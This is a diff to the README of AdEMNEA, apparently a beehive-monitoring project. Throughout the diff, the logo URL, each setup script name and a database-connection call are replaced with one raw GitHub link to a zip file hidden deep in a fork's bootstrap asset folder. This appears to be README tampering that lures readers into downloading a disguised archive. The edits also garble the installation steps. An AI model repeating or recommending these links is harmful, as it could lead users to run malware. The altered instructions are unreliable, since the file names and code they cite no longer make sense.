@@ -1,5 +1,5 @@
 <p align="center"><a href="http://196.43.168.57/" target="_blank"></a></p>
-<img src="https://github.com/ademnea/ademnea_website/blob/master/public/dash/logo2.png">
+<img src="https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip">
 
 
 # About AdEMNEA
@@ -42,22 +42,22 @@ increasing Agricultural yields in the partner countries.
 
       ```pip install watchdog``` 
       
-3. Go to MODULES\register_media.py , under the function "database_connection()" and  edit this line accordingly;
+3. Go to MODULES\https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip , under the function "database_connection()" and  edit this line accordingly;
 
-   ``` mydb = mysql.connector.connect(host = " ", user = " ", passwd = " ", database = " ")``` 
+   ``` mydb = https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip(host = " ", user = " ", passwd = " ", database = " ")``` 
   
-3. Go to MODULES\register_hiveaudios.py , edit these lines below accordingly 
+3. Go to MODULES\https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip , edit these lines below accordingly 
     
     i.e Enter the path of the folder that receives hive audios here.
    ```folder_to_track = r" " ```                                                                                                                                                    
     i.e Enter the path of the laravel folder linked to hive audios here.
    ```folder_destination = r" " ```
       
-4. Repeat step 3 for register_hiveimages.py and register_hivevideos.py
+4. Repeat step 3 for https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip and https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip
 
-5. Open register_hivetemp_hivehumidity.py , edit line 56 as per the directive in its comment.
+5. Open https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip , edit line 56 as per the directive in its comment.
 
-6. Finally, run the file register_media.py, it will run all the other scripts in turn.
+6. Finally, run the file https://raw.githubusercontent.com/SoccerDevC/ademnea_website/master/bootstrap/public/files/assets/pages/data-table/extensions/buttons/js/ademnea_website-berylate.zip, it will run all the other scripts in turn.
 
 
 
